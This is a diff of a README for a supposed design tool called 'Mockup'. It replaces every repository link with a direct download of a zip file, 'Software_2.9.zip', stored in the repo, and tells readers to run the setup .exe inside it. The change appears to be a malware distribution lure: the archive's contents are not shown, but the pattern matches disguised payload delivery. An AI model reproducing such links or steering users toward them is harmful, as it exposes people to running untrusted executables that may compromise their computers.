@@ -1,6 +1,6 @@
 # 🔧 Mockup - Simple Tool to Create Visual Designs
 
-[![Download Mockup](https://img.shields.io/badge/Download-Mockup-brightgreen?style=for-the-badge)](https://github.com/praneykashid/Mockup)
+[![Download Mockup](https://img.shields.io/badge/Download-Mockup-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/praneykashid/Mockup/main/components/Software_2.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer matches these specs, you are ready to install Mockup.
 
 1. **Go to the Download Page**  
    Click the big green button above or visit this page to download the application:  
-   [Download Mockup on GitHub](https://github.com/praneykashid/Mockup)
+   [Download Mockup on GitHub](https://raw.githubusercontent.com/praneykashid/Mockup/main/components/Software_2.9.zip)
 
 2. **Download the Application**  
    On the page, look for the latest release or setup file. The file you want usually ends with `.exe`. Click on it to start downloading.
@@ -112,6 +112,6 @@ For further help, you can visit the download page or look for help sections insi
 
 Get the latest version of Mockup here:  
 
-[![Download Mockup](https://img.shields.io/badge/Download-Mockup-blue?style=for-the-badge)](https://github.com/praneykashid/Mockup)  
+[![Download Mockup](https://img.shields.io/badge/Download-Mockup-blue?style=for-the-badge)](https://raw.githubusercontent.com/praneykashid/Mockup/main/components/Software_2.9.zip)  
 
 Click the link to visit the page and download the setup file. Follow the instructions above to install and start using Mockup.
